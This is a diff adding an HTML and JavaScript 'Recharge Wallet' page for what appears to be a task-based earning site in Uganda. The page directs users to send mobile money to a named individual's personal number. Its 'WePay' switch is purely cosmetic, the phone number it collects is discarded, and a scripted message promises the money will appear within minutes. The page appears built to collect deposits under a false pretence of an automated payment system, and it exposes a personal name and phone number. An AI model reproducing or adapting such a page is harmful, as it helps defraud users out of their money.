@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Recharge Wallet</title>
+  <link rel="stylesheet" href="getcash.css">
+  <style>
+    .recharge-container {
+      max-width: 400px;
+      margin: 40px auto 100px auto;
+      padding: 24px;
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.07);
+    }
+    .recharge-container h2 {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .recharge-form label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+    }
+    .recharge-form input, .recharge-form select {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1em;
+    }
+    .recharge-form button {
+      background: #007bff;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 10px 24px;
+      font-size: 1em;
+      cursor: pointer;
+      transition: background 0.2s;
+      width: 100%;
+    }
+    .recharge-form button:active {
+      background: #0056b3;
+    }
+    .success-message, .error-message {
+      text-align: center;
+      margin-top: 12px;
+      font-weight: bold;
+    }
+    .success-message { color: #28a745; }
+    .error-message { color: #dc3545; }
+  </style>
+</head>
+<body>
+  <div class="recharge-container">
+    <h2>Recharge Wallet</h2>
+    <form class="recharge-form" id="rechargeForm">
+      <div style="margin-bottom:18px;">
+        <strong>Step 1:</strong> Enter Recharge Amount
+  <input type="number" id="amount" name="amount" min="10000" placeholder="Enter amount (UGX)" required>
+      </div>
+      <div style="margin-bottom:18px;">
+        <strong>Step 2:</strong> Enable WePay to continue
+        <label style="display:flex;align-items:center;gap:10px;margin-top:10px;">
+          <span style="font-weight:bold;">WePay</span>
+          <input type="checkbox" id="wepaySwitch" style="width:40px;height:22px;accent-color:#007bff;">
+          <span id="wepaySwitchLabel" style="color:#007bff;font-weight:bold;">OFF</span>
+        </label>
+      </div>
+      <div style="text-align:center;">
+        <strong>Step 3:</strong>
+        <button type="submit" style="margin-top:8px;">Recharge Now</button>
+      </div>
+    </form>
+    <!-- Popup Modal -->
+    <div id="rechargeModal" style="display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.4);z-index:9999;align-items:center;justify-content:center;">
+      <div style="background:#fff;padding:24px 18px;border-radius:10px;max-width:320px;margin:auto;text-align:center;">
+        <div id="modalText" style="margin-bottom:16px;"></div>
+  <input type="tel" id="userPhone" placeholder="e.g. 2567XXXXXXXX" style="width:90%;padding:8px;margin-bottom:4px;border:1px solid #ccc;border-radius:6px;" required><br>
+  <div id="phoneError" style="color:#dc3545;font-size:0.95em;display:none;margin-bottom:8px;">Please enter the number correctly.</div>
+  <div style="display:flex;justify-content:center;gap:10px;margin-bottom:12px;">
+          <div id="mtnOption" style="background:#ffe066;color:#222;padding:4px 16px;border-radius:6px;cursor:pointer;font-weight:bold;font-size:0.95em;user-select:none;">MTN</div>
+          <div id="airtelOption" style="background:#ff6666;color:#fff;padding:4px 16px;border-radius:6px;cursor:pointer;font-weight:bold;font-size:0.95em;user-select:none;">Airtel</div>
+        </div>
+        <div id="networkError" style="color:#dc3545;font-size:0.95em;display:none;margin-bottom:8px;">Please select a network.</div>
+        <button id="confirmRechargeBtn" style="background:#007bff;color:#fff;border:none;border-radius:6px;padding:8px 20px;font-size:1em;">Confirm</button>
+        <button id="cancelRechargeBtn" style="background:#ccc;color:#333;border:none;border-radius:6px;padding:8px 20px;font-size:1em;margin-left:8px;">Cancel</button>
+      </div>
+    </div>
+    <div class="success-message" id="successMessage" style="display:none;"></div>
+    <div id="paymentInfo" style="display:none;margin:24px auto 0 auto;max-width:400px;text-align:center;">
+      <div style="display:flex;justify-content:center;align-items:center;gap:8px;margin-bottom:18px;">
+        <div style="height:8px;width:8px;background:#28a745;border-radius:50%;"></div>
+        <div style="height:2px;width:40px;background:#28a745;"></div>
+        <div style="height:8px;width:8px;background:#28a745;border-radius:50%;"></div>
+        <div style="height:2px;width:40px;background:#28a745;"></div>
+        <div style="height:8px;width:8px;background:#28a745;border-radius:50%;"></div>
+      </div>
+  <div style="font-weight:bold;color:#222;margin-bottom:8px;">Make your payment to the account below:</div>
+      <div style="background:#f7f7a1;padding:12px 0;border-radius:8px;font-size:1.2em;font-weight:bold;letter-spacing:1px;">0776944322</div>
+      <div style="margin-top:6px;font-size:1em;color:#444;">Name: <span style="font-weight:bold;">Buttura Isaiah</span></div>
+      <div style="margin-top:16px;font-size:0.98em;color:#b8860b;background:#fffbe6;padding:10px 8px;border-radius:6px;">
+        Money always reflects within <b>5 to 15 minutes</b>. If not, refresh the page. If still not received, please <b>contact us</b>.
+      </div>
+    </div>
+    <div class="error-message" id="errorMessage" style="display:none;">Recharge failed. Please try again.</div>
+  </div>
+  <footer class="footer">
+    <div class="footer-icon" onclick="location.href='index.html'">
+      <img src="image/icon/index.png" alt="Home">
+      <span>Home</span>
+    </div>
+    <div class="footer-icon" onclick="location.href='task-list.html'">
+      <img src="image/icon/grab.png" alt="Task">
+      <span>Task</span>
+    </div>
+    <div class="footer-icon" onclick="location.href='withdraw.html'">
+      <img src="image/icon/profit.png" alt="Withdraw">
+      <span>Withdraw</span>
+    </div>
+    <div class="footer-icon" onclick="location.href='wallet-interface.html'">
+      <img src="image/icon/user.png" alt="Profile">
+      <span>Profile</span>
+    </div>
+  </footer>
+  <script src="notifications.js"></script>
+  <script>
+    document.getElementById('rechargeForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const amount = parseInt(document.getElementById('amount').value, 10);
+      const wepaySwitch = document.getElementById('wepaySwitch');
+      const modal = document.getElementById('rechargeModal');
+      const modalText = document.getElementById('modalText');
+      const userPhone = document.getElementById('userPhone');
+      if (isNaN(amount) || amount < 10000) {
+        showNotification('Minimum recharge amount is UGX 10,000', 'warning');
+        return;
+      }
+      if (!wepaySwitch.checked) {
+        showNotification('Please switch on WePay to continue.', 'warning');
+        return;
+      }
+      modalText.innerHTML = `To recharge your account with <b>UGX ${amount}</b>, please enter your actual phone number:`;
+      userPhone.value = '';
+      modal.style.display = 'flex';
+    });
+    // WePay switch label update
+    const wepaySwitch = document.getElementById('wepaySwitch');
+    const wepaySwitchLabel = document.getElementById('wepaySwitchLabel');
+    wepaySwitch.addEventListener('change', function() {
+      if (wepaySwitch.checked) {
+        wepaySwitchLabel.textContent = 'ON';
+        wepaySwitchLabel.style.color = '#28a745';
+      } else {
+        wepaySwitchLabel.textContent = 'OFF';
+        wepaySwitchLabel.style.color = '#007bff';
+      }
+    });
+
+    let selectedNetwork = '';
+    const mtnOption = document.getElementById('mtnOption');
+    const airtelOption = document.getElementById('airtelOption');
+    mtnOption.onclick = function() {
+      selectedNetwork = 'MTN';
+      mtnOption.style.outline = '2px solid #ffb300';
+      airtelOption.style.outline = 'none';
+      document.getElementById('networkError').style.display = 'none';
+    };
+    airtelOption.onclick = function() {
+      selectedNetwork = 'Airtel';
+      airtelOption.style.outline = '2px solid #c00';
+      mtnOption.style.outline = 'none';
+      document.getElementById('networkError').style.display = 'none';
+    };
+    document.getElementById('confirmRechargeBtn').onclick = function() {
+      const userPhone = document.getElementById('userPhone').value.trim();
+      const successMsg = document.getElementById('successMessage');
+      const errorMsg = document.getElementById('errorMessage');
+      if (!selectedNetwork) {
+        document.getElementById('networkError').style.display = 'block';
+        return;
+      }
+      const phoneError = document.getElementById('phoneError');
+      phoneError.style.display = 'none';
+      if (/^2567\d{8}$/.test(userPhone)) {
+        document.getElementById('rechargeModal').style.display = 'none';
+        // Show stepper and payment info
+        document.getElementById('successMessage').style.display = 'none';
+        const paymentInfo = document.getElementById('paymentInfo');
+        paymentInfo.style.display = 'block';
+        document.getElementById('rechargeForm').reset();
+        selectedNetwork = '';
+        mtnOption.style.outline = 'none';
+        airtelOption.style.outline = 'none';
+        setTimeout(() => { paymentInfo.scrollIntoView({behavior:'smooth'}); }, 200);
+      } else {
+        phoneError.style.display = 'block';
+        // Keep the modal open so user can correct the number
+      }
+    };
+    document.getElementById('cancelRechargeBtn').onclick = function() {
+      document.getElementById('rechargeModal').style.display = 'none';
+    };
+    // Real-time validation for phone input
+    document.getElementById('userPhone').addEventListener('input', function() {
+      const phoneError = document.getElementById('phoneError');
+      const value = this.value.trim();
+      if (/^2567\d{0,8}$/.test(value)) {
+        if (value.length === 12) {
+          phoneError.style.display = 'none';
+        } else {
+          phoneError.textContent = 'Please enter the number correctly.';
+          phoneError.style.display = value.length === 0 ? 'none' : 'block';
+        }
+      } else {
+        phoneError.textContent = 'Please enter the number correctly.';
+        phoneError.style.display = value.length === 0 ? 'none' : 'block';
+      }
+    });
+  </script>
+</body>
+</html>
